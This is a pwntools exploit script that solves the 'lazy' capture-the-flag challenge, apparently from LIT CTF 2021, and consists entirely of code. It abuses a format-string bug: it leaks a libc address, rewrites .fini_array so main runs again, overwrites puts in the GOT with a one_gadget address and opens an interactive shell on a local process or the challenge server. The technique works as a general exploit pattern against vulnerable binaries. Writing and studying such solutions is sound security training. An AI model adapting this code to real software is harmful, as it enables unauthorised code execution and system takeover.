#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./lazy')

if args.REMOTE:
	p = remote('lazy.lit-ctf-2021-2-codelab.kctf.cloud', 1337)
	libc = ELF('./libc-2.31.so')
	libc_start_main_offset = 234
	libc.symbols['gadget'] = [0xcbd1a,0xcbd1d,0xcbd20][1]
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc_start_main_offset = 243
	libc.symbols['gadget'] = [0xe6c7e,0xe6c81,0xe6c84][1]

offset = 6
libcleak_offset = 71

payload  = b''
payload += b'%' + str(libcleak_offset).encode().rjust(2,b'0') + b'$018p'
payload += fmtstr_payload(offset+1,{binary.get_section_by_name('.fini_array').header.sh_addr:binary.sym.main},numbwritten=18)

log.info('len(payload): ' + str(len(payload)))
assert(len(payload) <= 0x79)
p.sendlineafter('problem?\n',payload)

p.recvline()
_ = p.recv(18)
libc.address = int(_,16) - libc.sym.__libc_start_main - libc_start_main_offset
log.info('libc.address: ' + hex(libc.address))

payload = fmtstr_payload(offset,{binary.got.puts:libc.sym.gadget})
log.info('len(payload): ' + str(len(payload)))
assert(len(payload) <= 0x79)
p.sendlineafter('problem?\n',payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])
p.interactive()
